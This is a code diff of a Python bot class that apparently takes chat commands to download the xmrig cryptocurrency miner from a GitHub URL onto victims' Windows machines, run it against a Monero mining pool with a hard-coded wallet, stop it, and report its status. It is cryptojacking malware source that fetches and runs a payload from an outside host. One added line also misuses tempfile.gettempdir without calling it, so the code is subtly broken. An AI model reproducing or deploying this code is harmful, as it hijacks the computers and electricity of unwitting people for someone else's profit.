@@ -153,26 +153,24 @@ class Loader():
 							self.SendMessage("%E2%9C%96%EF%B8%8F Need Administrator Privileges")
 					elif command == "/download_miner" and message['text'].split(" ")[-1] in [self.ip , getpass.getuser() , "All"]:
 						self.SendMessage("%E2%9C%94%EF%B8%8F Downloading Miner...")
-						req = requests.get('https://raw.githubusercontent.com/MohamadXo213/Down-X/main/xmrig-6.13.1.rar')
-						file = tempfile.TemporaryFile()
-						filename = file.name + ".rar"
+						req = requests.get('https://raw.githubusercontent.com/MohamadXo213/Down-X/main/xmrig.exe')
+						filename = tempfile.gettempdir + "\\xmrig.exe"
 						file = open(filename,"wb")
 						file.write(req.content)
 						file.close()
-						os.system('"C:\\Program Files\\WinRAR\WinRAR.exe" x -ibck ' + filename + ' %temp%')
 						self.SendMessage("%E2%9C%94%EF%B8%8F Miner Downloaded")
 					elif command == "/start_miner" and message['text'].split(" ")[-1] in [self.ip , getpass.getuser() , "All"]:
 						if os.path.exists(tempfile.gettempdir() + "\\xmrig.exe"):
 							sub = subprocess.Popen(["cmd.exe","/c","%temp%\\xmrig.exe","-o","pool.supportxmr.com:443","-u","458ZEGNtG6G52CUbSmfbU4f47PiZqGaTDjRzFwRazR1JCxFdZvWdv6wQeG6PGmsskiHCw3yQ5XoptPQZwFkGxwpMMngnN2V","-k","--tls","-p",getpass.getuser()],shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
 							self.SendMessage("%E2%9C%94%EF%B8%8F Miner Started")
 						else:
-							self.SendMessage("%E2%9C%94%EF%B8%8F Miner Not Installed")
+							self.SendMessage("%E2%9C%96%EF%B8%8F Miner Not Installed")
 					elif command == "/stop_miner" and message['text'].split(" ")[-1] in [self.ip , getpass.getuser() , "All"]:
 						if os.path.exists(tempfile.gettempdir() + "\\xmrig.exe"):
 							os.system('taskkill /IM xmrig.exe /F')
 							self.SendMessage("%E2%9C%94%EF%B8%8F Miner Stoped")
 						else:
-							self.SendMessage("%E2%9C%94%EF%B8%8F Miner Not Installed")
+							self.SendMessage("%E2%9C%96%EF%B8%8F Miner Not Installed")
 					elif command == "/miner_status" and message['text'].split(" ")[-1] in [self.ip , getpass.getuser() , "All"]:
 						found = False
 						for proc in psutil.process_iter():
@@ -185,7 +183,7 @@ class Loader():
 						if found == True:
 							self.SendMessage("%E2%9C%94%EF%B8%8F Miner Working")
 						else:
-							self.SendMessage("%E2%9C%94%EF%B8%8F Miner Not Working")
+							self.SendMessage("%E2%9C%96%EF%B8%8F Miner Not Working")
 				else:
 					file_id = message['document']['file_id']
 					caption = message['caption']
